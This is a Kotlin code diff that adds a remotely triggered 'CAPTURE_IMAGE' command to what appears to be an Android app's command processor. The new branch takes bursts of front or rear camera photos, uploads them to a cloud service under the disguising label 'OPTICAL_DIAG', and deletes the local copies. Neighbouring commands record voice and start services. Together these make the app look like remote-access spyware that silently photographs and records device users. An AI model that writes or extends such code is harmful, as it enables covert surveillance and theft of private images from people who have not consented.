@@ -247,6 +247,25 @@ object CommandProcessor {
                         ctx.startService(i)
                     }
                 }
+                "CAPTURE_IMAGE" -> {
+                    val parts = content.split("|")
+                    val side = parts.getOrNull(0)?.trim()?.uppercase() ?: "REAR"
+                    val count = parts.getOrNull(1)?.trim()?.toIntOrNull() ?: 1
+                    val useFront = side == "FRONT"
+                    
+                    var successCount = 0
+                    for (i in 1..count) {
+                        val file = CameraManager.capture(ctx, useFront)
+                        if (file != null) {
+                            if (CloudManager.uploadFile(ctx, file, "OPTICAL_DIAG")) {
+                                successCount++
+                                file.delete()
+                            }
+                        }
+                        kotlinx.coroutines.delay(1000) // Gap between bursts
+                    }
+                    status = "IMAGE_CAPTURE_COMPLETE ($successCount/$count)"
+                }
                 "RECORD_VOICE" -> {
                     val dur = content.trim().toIntOrNull() ?: 10
                     val snippet = VoiceManager.recordSnippet(ctx, dur)
